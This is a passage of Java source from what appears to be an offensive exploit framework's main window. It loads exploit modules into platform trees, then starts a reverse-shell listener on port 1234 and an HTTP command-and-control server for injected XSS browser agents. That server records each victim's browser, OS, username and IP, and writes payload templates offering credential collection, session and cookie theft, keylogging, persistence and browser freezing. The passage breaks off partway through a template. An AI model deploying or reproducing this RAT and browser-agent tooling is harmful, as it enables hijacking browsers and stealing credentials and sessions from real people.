                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 20);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("irix")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 21);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 21);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("java")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 22);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 22);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("jsp")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 23);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 23);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("lin_amd64")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 24);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 24);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("lin_x86")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 25);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 25);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("lin_x86-64")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 26);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 26);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("linux")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 27);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 27);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("linux_mips")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 28);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 28);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("linux_ppc")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 29);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 29);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("linux_sparc")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 30);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 30);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("minix")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 31);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 31);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("mips")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 32);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 32);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("multiple")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 33);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 33);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("netbsd_x86")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 34);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 34);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("netware")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 35);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 35);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("novell")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 36);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 36);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("openbsd")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 37);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 37);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("openbsd_x86")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 38);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 38);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("osx")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 39);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 39);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("osx_ppc")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 40);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 40);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("palm_os")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 41);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 41);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("php")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 42);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 42);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("plan9")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 43);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 43);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("qnx")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 44);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 44);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("sco")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 45);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 45);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("sco_x86")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 46);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 46);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("sh4")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 47);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 47);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("solaris")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 48);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 48);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("solaris_sparc")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 49);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 49);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("solaris_x86")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 50);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 50);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("tru64")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 51);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 51);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("ultrix")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 52);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 52);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("unix")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 53);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 53);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("unixware")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 54);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 54);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("webapps")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 55);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 55);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("win32")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 56);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 56);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("win64")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 57);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 57);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("windows")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 58);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 58);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("xml")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 59);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 59);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }

                        // Create Custom Exploits
                        if (NewXMLNode.Platform.equals("custom")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 0);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        }
                        TotalModulesLength = i;
                    }
                }
            }

            jTreeExploits.expandRow(0);
            jTreeNotepad.expandRow(0);
            jTreeTools.expandRow(0);
            DefaultTreeModel modelModuleStatus = (DefaultTreeModel) jTreeModuleStatus.getModel();
            DefaultMutableTreeNode rootStatus = (DefaultMutableTreeNode) modelModuleStatus.getChild(modelModuleStatus.getRoot(), 0);
            rootStatus.add(new DefaultMutableTreeNode("This Pack: " + TotalModulesLength));
            jTreeModuleStatus.expandRow(0);
            modelModuleStatus.reload(rootStatus);

            if (TotalModulesLength < 1000) {
                NotEnough.main((null));
            } else if (helper.get(1).equals("open")) {
                DidyouKnow.main(null);
            }

            DefaultTreeModel modelRAT = (DefaultTreeModel) jTreeRAT.getModel();
            DefaultMutableTreeNode rootRAT = (DefaultMutableTreeNode) modelRAT.getChild(modelRAT.getRoot(), 0);
            rootRAT.add(new DefaultMutableTreeNode("127.0.1.1"));
            jTreeRAT.expandRow(0);
            modelRAT.reload(rootRAT);

            DefaultTreeModel modelScanner = (DefaultTreeModel) jTreeRemoteScanner.getModel();
            DefaultMutableTreeNode rootScanner = (DefaultMutableTreeNode) modelScanner.getChild(modelScanner.getRoot(), 0);
            rootScanner.add(new DefaultMutableTreeNode("Source: " + Inet4Address.getLocalHost().getHostAddress()));
            jTreeRemoteScanner.expandRow(0);
            modelScanner.reload(rootScanner);

            jTextAreaQuickInfo.append("[" + LogTime + "] " + "Total modules on this instance: "
                    + TotalModulesLength + "\n");
            jTextAreaQuickInfo.append("[" + LogTime + "] " + "Available in packs: 34.890" + "\n");

            // EPLog
            EPLogger.log("Modules loaded successfully: OK");
            EPLogger.log("Total of modules for this instance: " + TotalModulesLength);
            EPLogger.log("Starting Reverse Shell listener on port 1234");

            // Start new agent server
            System.out.println("Multi-Thread Agent - Started");
            Thread agentServer;
            agentServer = new Thread("agentThread") {
                @Override
                public void run() {
                    try {
                        ServerSocket ssock = new ServerSocket(1234);
                        while (true) {
                            Socket sock = ssock.accept();
                            InetSocketAddress sockaddr = (InetSocketAddress) sock.getRemoteSocketAddress();
                            InetAddress inaddr = sockaddr.getAddress();
                            boolean ratNew = false;
                            ArrayList ratList = new ArrayList();
                            DefaultMutableTreeNode rootRATcheck = rootRAT.getNextNode();

                            for (int i = 0; i < rootRAT.getChildCount(); i++) {
                                ratList.add(rootRATcheck.getParent().getChildAt(i).toString());
                            }
                            if (!ratList.contains(inaddr.getHostAddress())) {
                                ratNew = true;
                            }
                            if (ratNew) {
                                DefaultTreeModel modelRATNew = (DefaultTreeModel) jTreeRAT.getModel();
                                DefaultMutableTreeNode rootRATNew = (DefaultMutableTreeNode) modelRATNew.getChild(modelRATNew.getRoot(), 0);
                                rootRATNew.add(new DefaultMutableTreeNode(inaddr.getHostAddress()));
                                jTreeRAT.expandRow(0);
                                modelRATNew.reload(rootRATNew);
                                File file = new File("exploits/"
                                        + inaddr.getHostAddress() + ".xml");
                                BufferedWriter output;
                                java.util.Date date = new java.util.Date();
                                output = new BufferedWriter(
                                        new FileWriter(file));
                                output.write("<?xml version=\"1.0\" encoding=\"UTF-8\"?>");
                                output.write("<Module><Exploit NameXML=\""
                                        + inaddr.getHostAddress()
                                        + "\" CodeName=\"RAT\"  Platform=\"rat\" Service=\"RAT\" Type=\"Remote Agent Connection\" RemotePort=\"5678\" LocalPort=\"\" ShellcodeAvailable=\"\" ShellPort=\"5678\" SpecialArgs=\"\"></Exploit>");
                                output.write("<Information Author=\"Juan Sacco\" Date=\""
                                        + new Timestamp(date.getTime())
                                        + "\" Vulnerability=\""
                                        + new Timestamp(date.getTime())
                                        + "\">\nA remote administration tool (a RAT) is a piece of software that allows a remote \"operator\" to control a system as if he has physical access to that system.\nWhile desktop sharing and remote administration have many legal uses, \"RAT\" software is usually associated with criminal or malicious activity.\nMalicious RAT software is typically installed without the victim's knowledge, often as payload of a Trojan horse, and will try to hide its operation\nfrom the victim and from security software. </Information><Targets>Targets vulnerables</Targets></Module>");
                                output.close();
                            }
                            new Thread(new MultiThreadServer(sock, multiServerip, multiServerport)).start();
                        }
                    } catch (IOException ex) {
                        Logger.getLogger(MainFrame.class.getName()).log(Level.SEVERE, null, ex);
                    }
                }
            };
            agentServer.start();

            // Start new agent server
            System.out.println("Browser Agent - Server - Started on port 8000");

            Thread xssServer;
            xssServer = new Thread("xssThread") {
                @Override
                public void run() {
                    try {
                        class MyHandler implements HttpHandler {

                            @Override
                            public final void handle(HttpExchange t) throws IOException {
                                // Obtain local time
                                Format formatter;
                                Date date = new Date();
                                formatter = new SimpleDateFormat("HH:mm:ss");
                                LogTime = formatter.format(date);
                                String[] tokens = t.getRequestURI().toString().split("&");
                                xssAgent.setId(tokens[1]);
                                if ("".equals(tokens[2])) {
                                    xssAgent.setHost("Localhost");
                                } else {
                                    xssAgent.setHost(tokens[2]);
                                }
                                if (!"".equals(tokens[5]) && !"executed".equals(tokens[5])) {
                                    jTextAreaShellcode.append("[" + LogTime + "] Response from " + xssAgent.getHost() + "-" + xssAgent.getId() + ": " + tokens[5].replace("%20", " ") + "\n");
                                    int len = jTextAreaShellcode.getDocument().getLength();
                                    jTextAreaShellcode.setCaretPosition(len);
                                }

                                xssAgent.setBrowser(tokens[3]);
                                xssAgent.setOs(tokens[4]);
                                xssAgent.setData(tokens[5]);
                                xssAgent.setTimes(tokens[6]);
                                xssAgent.setUsername(tokens[7]);
                                xssAgent.setremoteIP(tokens[8]);
                                boolean ratNew = false;
                                ArrayList ratList = new ArrayList();
                                DefaultMutableTreeNode rootRATcheck = rootRAT.getNextNode();
                                for (int i = 0;
                                        i < rootRAT.getChildCount();
                                        i++) {
                                    ratList.add(rootRATcheck.getParent().getChildAt(i).toString());
                                }

                                if (!ratList.contains(xssAgent.getHost() + "-" + xssAgent.getId())) {
                                    ratNew = true;
                                                                    try {
                                    System.out.println("here"); 
                                    AudioInputStream s = null;
                                    AudioFormat f;
                                    DataLine.Info i;
                                    File inputFile = new File("data/newconnectiontorat.wav");
                                    Clip c;
                                    s = AudioSystem.getAudioInputStream(inputFile);
                                    f = s.getFormat();
                                    i = new DataLine.Info(Clip.class, f);
                                    c = (Clip) AudioSystem.getLine(i);
                                    c.open(s);
                                    c.start();
                                } catch (UnsupportedAudioFileException | LineUnavailableException ex) {
                                    Logger.getLogger(MainFrame.class.getName()).log(Level.SEVERE, null, ex);
                                }
                                }
                                if (ratNew) {
                                    DefaultTreeModel modelRATNew = (DefaultTreeModel) jTreeRAT.getModel();
                                    DefaultMutableTreeNode rootRATNew = (DefaultMutableTreeNode) modelRATNew.getChild(modelRATNew.getRoot(), 0);
                                    rootRATNew.add(new DefaultMutableTreeNode(xssAgent.getHost() + "-" + xssAgent.getId()));
                                    jTreeRAT.expandRow(0);
                                    modelRATNew.reload(rootRATNew);
                                    File file = new File("exploits/"
                                            + xssAgent.getHost() + "-" + xssAgent.getId() + ".xml");
                                    BufferedWriter output;
                                    output = new BufferedWriter(
                                            new FileWriter(file));
                                    output.write("<?xml version=\"1.0\" encoding=\"UTF-8\"?>");
                                    output.write("<Module><Exploit NameXML=\""
                                            + xssAgent.getId()
                                            + "\" CodeName=\"" + xssAgent.getHost() + "-" + xssAgent.getId() + ".js" + "\"  Platform=\"xss\" Service=\"RAT\" Type=\"Browser Agent Connection\" RemotePort=\"" + xssAgent.getremoteIP() + "\" LocalPort=\"\" ShellcodeAvailable=\"\" ShellPort=\"" + xssAgent.getBrowser() + "\" SpecialArgs=\"" + xssAgent.getOs() + "\"></Exploit>");
                                    output.write("<Information Author=\"Exploit Pack\" Date=\""
                                            + new Timestamp(date.getTime())
                                            + "\" Vulnerability=\""
                                            + new Timestamp(date.getTime())
                                            + "\">\nA Remote Browser's Agent ( XSS ) is a piece of software that allows a remote \"operator\" to control a browser as if he has physical access to that system.\nWhile desktop sharing and remote administration have many legal uses, \"XSS\" software is usually associated with criminal or malicious activity.\nMalicious XSS agent software is typically injected without the victim's knowledge, often as payload on a website, and will try to hide its operation\nfrom the victim and from security software. </Information><Targets>Targets vulnerables</Targets></Module>");
                                    output.close();

                                    File fileCode = new File("exploits/code/"
                                            + xssAgent.getHost() + "-" + xssAgent.getId() + ".js");
                                    BufferedWriter outputCode;
                                    outputCode = new BufferedWriter(
                                            new FileWriter(fileCode));
                                    outputCode.write("// This is your JS payload that will be sent to the Browser Agent" + "\n");
                                    outputCode.write("// Useful commands available in the built-in Browser Agent:" + "\n");
                                    outputCode.write("// ------------------------------------------------------------" + "\n");
                                    outputCode.write("// Commands list for the agent:" + "\n");
                                    outputCode.write("// showAlert(message) - To display a message" + "\n");
                                    outputCode.write("// Dialog(message) - To display a Dialog and receive the answer" + "\n");
                                    outputCode.write("// GetCredentials(credentials) - Collect user's credentials" + "\n");
                                    outputCode.write("// GetSession() - Get user's sessions" + "\n");
                                    outputCode.write("// Freeze() - Infinite loop the remote browser" + "\n");
                                    outputCode.write("// PersistAggresive() - Persist the session on the remote browser" + "\n");
                                    outputCode.write("// redirectSite(url) - Redirect the user to the desired URL" + "\n");
                                    outputCode.write("// execJS(code) - Execute your JS on inside a script tag" + "\n");
                                    outputCode.write("// monster() - Call the Cookie monster on the user's browser" + "\n");
                                    outputCode.write("// tabKiller() - Kill the current tab ( Firefox, Chrome )" + "\n");
                                    outputCode.write("// PersistOnClick() - Persist the agent on an OnClick event" + "\n");
                                    outputCode.write("// jokeImages() - Make spin the images of the open pages" + "\n");
                                    outputCode.write("// protectMySite() - Activate the keylogging function and block XSS and SQLi attempts" + "\n");
                                    outputCode.write("// xssProtect() - Activate the XSS client-side protection on the desired browser " + "\n");
                                    outputCode.write("// sqlProtect() - Activate the SQLi client-side protection on the desired browser " + "\n");
                                    outputCode.write("// banIP(ip) - Add the desired IP/Hostname to your blacklist " + "\n");
                                    outputCode.write("// addIPtoBanList() - Add the current IP/Hostname to your blacklist " + "\n");
                                    outputCode.write("// antiCopyPaste() - Prevent the remote user of copy/paste the page " + "\n");
                                    outputCode.write("// noCTRL() - Deactivate the CTRL functions " + "\n");
                                    outputCode.write("// scanEngine(host) - Launch a discover scan from the remote browser " + "\n");
                                    outputCode.write("// portScanner(host) - Launch a portscan from the remote browser to a specific host " + "\n");
                                    outputCode.write("// launchWindow(id) - Create a new windows with the specified height, width " + "\n");
                                    outputCode.write("// exploitThis(exploitName) - Execute an exploit ( Browser ) from the agent " + "\n");
                                    outputCode.write("// scanForThreats() - Discover remote plugins and useful information for testing " + "\n");
                                    outputCode.write("// Plugins() - Obtains a list of running plugins on the remote host " + "\n");
                                    outputCode.write("// ScreenSize() - Calculate and retrieve current Window size " + "\n");
                                    outputCode.write("// ------------------------------" + "\n");
                                    outputCode.write("// Your commands or code goes here: \n// Example: alert(1);" + "\n");
                                    outputCode.write("// ------------------------------------------------------------" + "\n");
                                    outputCode.close();
                                } else if (!"".equals(tokens[5]) && "executed".equals(tokens[5])) {
                                    File fileCode = new File("exploits/code/"
                                            + xssAgent.getHost() + "-" + xssAgent.getId() + ".js");
                                    BufferedWriter outputCode;
                                    outputCode = new BufferedWriter(
                                            new FileWriter(fileCode));
                                    outputCode.write("// This is your JS payload that will be sent to the Browser Agent" + "\n");
                                    outputCode.write("// Useful commands available in the built-in Browser Agent:" + "\n");
                                    outputCode.write("// ------------------------------------------------------------" + "\n");
                                    outputCode.write("// Commands list for the agent:" + "\n");
                                    outputCode.write("// showAlert(message) - To display a message" + "\n");
                                    outputCode.write("// Dialog(message) - To display a Dialog and receive the answer" + "\n");
                                    outputCode.write("// GetCredentials(credentials) - Collect user's credentials" + "\n");
                                    outputCode.write("// GetSession() - Get user's sessions" + "\n");
                                    outputCode.write("// Freeze() - Infinite loop the remote browser" + "\n");
                                    outputCode.write("// PersistAggresive() - Persist the session on the remote browser" + "\n");
